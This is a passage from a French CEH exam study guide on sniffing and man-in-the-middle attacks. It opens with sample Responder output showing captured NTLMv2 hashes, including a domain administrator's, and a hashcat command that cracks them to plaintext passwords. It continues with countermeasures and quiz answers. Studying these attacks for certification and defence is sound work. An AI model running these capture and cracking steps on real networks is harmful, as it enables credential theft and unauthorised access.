    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [eth0]
    Responder IP               [192.168.1.5]
    Responder IPv6             [fe80::a00:27ff:fea1:bcde]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']

[+] Current Session Variables:
    Responder Machine Name     [WIN-TZQB9KQKZ3P]
    Responder Domain Name      [HVWG.LOCAL]
    Responder DCE-RPC Port     [47553]

[+] Listening for events...

[*] [LLMNR] Poisoned answer sent to 192.168.1.20 for name SERVEUR-FICHIERS
[SMB] NTLMv2-SSP Client   : 192.168.1.20
[SMB] NTLMv2-SSP Username : CORP\jean.muamba
[SMB] NTLMv2-SSP Hash     : jean.muamba::CORP:7c70571f7f67b043:B4E5A2E5843B4024
    3AD5A8C77854E1B3:0101000000000000006F3A1F3D6BDA01EC8D9B2B7891C3CA0000000002000800
    48564F470004001E00480056005700470002004A0000000000000000

[*] [LLMNR] Poisoned answer sent to 192.168.1.15 for name DC-BACKUP
[SMB] NTLMv2-SSP Client   : 192.168.1.15
[SMB] NTLMv2-SSP Username : CORP\Administrateur
[SMB] NTLMv2-SSP Hash     : Administrateur::CORP:4d9f2a3b6c1e8f07:C7F3A1B9E4D2...
```

```bash
# Craquer le hash NTLMv2 capturé avec Hashcat
hashcat -m 5600 ntlmv2_hashes.txt /usr/share/wordlists/rockyou.txt
```

**Sortie Hashcat :**
```
jean.muamba::CORP:7c70571f7f67b043:...:Kinshasa2024
Administrateur::CORP:4d9f2a3b6c1e8f07:...:Admin@Corp2024

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Time.Started.....: Fri Nov 15 19:00:12 2024 (12 secs)

→ 2 comptes domaine crackés !
```

---

## 📌 PARTIE 10 : CONTRE-MESURES — COMMENT SE DÉFENDRE

```
CONTRE-MESURES AU SNIFFING ET MITM :
══════════════════════════════════════════════════════════════════════

CONTRE ARP SPOOFING :
├── Dynamic ARP Inspection (DAI)
│   → Fonctionnalité des switches managés
│   → Valide les ARP replies contre la base DHCP Snooping
│   → Configure sur Cisco :
│     ip dhcp snooping vlan 1-100
│     ip arp inspection vlan 1-100
│
├── ARP Static Entries
│   → Configurer les entrées ARP critiques en statique
│   → arp -s 192.168.1.1 C8:D7:19:AB:12:3F
│   → Peu pratique à grande échelle
│
└── Détection par monitoring
    → IDS détecte les ARP replies non sollicitées
    → Arpwatch surveille les changements ARP

CONTRE MAC FLOODING :
├── Port Security sur les switches Cisco :
│   interface FastEthernet0/1
│   switchport port-security maximum 5
│   switchport port-security violation shutdown
│   switchport port-security
│
└── Surveiller les logs switch pour MAC address flapping

CONTRE DHCP STARVATION :
├── DHCP Snooping :
│   ip dhcp snooping
│   ip dhcp snooping vlan 1-100
│   → Seuls les ports "trusted" peuvent servir du DHCP
│
└── Rate limiting des requêtes DHCP par port

CONTRE DNS SPOOFING :
├── DNSSEC (DNS Security Extensions)
│   → Signe cryptographiquement les réponses DNS
│   → Impossible de forger une réponse signée
│
├── DNS over HTTPS (DoH) ou DNS over TLS (DoT)
│   → Chiffrement des requêtes DNS
│
└── Monitoring des réponses DNS anormales

CONTRE SSL STRIPPING :
├── HSTS (HTTP Strict Transport Security)
│   → Serveur déclare : "Ne jamais se connecter en HTTP"
│   → Navigateur force HTTPS même si le lien est HTTP
│   Header: Strict-Transport-Security: max-age=31536000
│
├── HSTS Preloading
│   → Domaines hardcodés dans les navigateurs
│   → Protection même première visite
│
└── HTTPS partout (HTTPS Everywhere)

CONTRE RESPONDER (LLMNR/NBT-NS) :
├── Désactiver LLMNR via GPO :
│   Computer Config → Admin Templates → Network
│   → DNS Client → Turn off Multicast Name Resolution = ENABLED
│
├── Désactiver NBT-NS :
│   Network Adapter → WINS → Disable NetBIOS over TCP/IP
│
└── Activer SMB Signing :
    → Empêche le relayage de credentials NTLM
    Computer Config → Windows Settings → Security Settings
    → Local Policies → Security Options
    → Microsoft network client: Digitally sign communications (always)

CONTRE LE SNIFFING EN GÉNÉRAL :
├── Chiffrer tous les protocoles (HTTPS, SSH, IMAPS, SFTP)
├── VPN sur les réseaux non sécurisés
├── 802.1X (authentification des équipements réseau)
├── Segmentation VLAN (isoler les segments)
└── Monitoring réseau (IDS/IPS, SIEM)
```

---

## 📌 RÉSUMÉ FINAL — CE QUE L'EXAMEN VA TESTER

```
✅ Mode promiscuous — définition et activation
✅ Hub vs Switch — pourquoi le sniffing differ
✅ Protocoles vulnérables vs sécurisés et leurs ports
✅ Wireshark — filtres d'affichage essentiels
✅ tcpdump — options principales (-i, -n, -A, -w, -r)
✅ ARP — fonctionnement normal et vulnérabilité fondamentale
✅ ARP Spoofing — mécanisme complet et outils (arpspoof, Bettercap)
✅ MAC Flooding — principe et impact sur la table CAM
✅ DHCP Starvation — mécanisme et outil (Yersinia)
✅ Rogue DHCP — comment il crée un MITM passif
✅ DNS Spoofing — cache poisoning et outil (Bettercap)
✅ SSL Stripping — mécanisme et contre-mesure (HSTS)
✅ Responder — LLMNR/NBT-NS poisoning et capture NTLMv2
✅ Hashcat -m 5600 pour craquer NTLMv2
✅ DAI (Dynamic ARP Inspection) — contre-mesure ARP
✅ DHCP Snooping — contre-mesure DHCP
✅ DNSSEC — contre-mesure DNS
✅ Port Security — contre-mesure MAC Flooding
✅ Désactivation LLMNR/NBT-NS — contre-mesure Responder
```

---

## 🧪 QUESTIONS TYPE EXAMEN CEH — MODULE 8

**Q1 :** Pourquoi le sniffing est-il plus difficile sur un réseau commuté (switch) que sur un hub ?
> **Réponse : Un switch envoie les trames uniquement au port destinataire grâce à sa table CAM. Un hub broadcaste tout à tous les ports. Sur switch, le mode promiscuous ne suffit pas — il faut des techniques comme l'ARP Spoofing.**

**Q2 :** Quelle est la vulnérabilité fondamentale du protocole ARP exploitée dans une attaque ARP Spoofing ?
> **Réponse : ARP est sans état et sans authentification. N'importe quelle machine peut envoyer des ARP Replies non sollicitées et les autres machines acceptent et mettent à jour leur cache sans vérification.**

**Q3 :** Comment activer le forwarding IP sur Linux avant de réaliser un ARP Spoofing pour ne pas couper internet à la victime ?
> **Réponse : `echo 1 > /proc/sys/net/ipv4/ip_forward` ou `sysctl -w net.ipv4.ip_forward=1`**

**Q4 :** Quel filtre Wireshark affiche uniquement les requêtes HTTP POST (contenant souvent des credentials) ?
> **Réponse : `http.request.method == "POST"`**

**Q5 :** Quelle technique permet à un attaquant de lire le trafic HTTPS d'une victime en position MITM ?
> **Réponse : SSL Stripping — l'attaquant dégrade la connexion HTTPS en HTTP entre lui et la victime, tout en maintenant une connexion HTTPS avec le serveur. La contre-mesure est HSTS.**

**Q6 :** Qu'est-ce que LLMNR et pourquoi Responder l'exploite-t-il ?
> **Réponse : LLMNR (Link-Local Multicast Name Resolution) résout les noms de machines localement quand DNS échoue. Il envoie des requêtes broadcast. Responder répond à ces requêtes en se faisant passer pour la machine cherchée, forçant une authentification NTLM et capturant le hash.**

**Q7 :** Quelle commande Hashcat craquer des hashes NTLMv2 capturés par Responder ?
> **Réponse : `hashcat -m 5600 hashes.txt rockyou.txt` — le mode 5600 correspond à NetNTLMv2.**

**Q8 :** Quelle fonctionnalité des switches Cisco protège contre l'ARP Spoofing ?
> **Réponse : Dynamic ARP Inspection (DAI) — valide les ARP replies en les comparant à la base de données DHCP Snooping. Une ARP Reply avec une MAC non correspondante est bloquée.**

**Q9 :** Qu'est-ce qu'un Rogue DHCP Server et quel avantage offre-t-il à l'attaquant ?
> **Réponse : Un serveur DHCP malveillant qui répond aux requêtes DHCP des victimes. L'attaquant contrôle la configuration réseau : il peut désigner sa propre machine comme passerelle par défaut (MITM automatique) et comme serveur DNS (DNS Spoofing).**

**Q10 :** Quel protocole de sécurité DNS empêche le DNS Cache Poisoning en signant cryptographiquement les réponses ?
> **Réponse : DNSSEC (DNS Security Extensions) — utilise des signatures cryptographiques pour authentifier les réponses DNS. Une réponse forgée sans la clé privée du domaine est détectée et rejetée.**

---

> **Module 8 terminé. ✅**
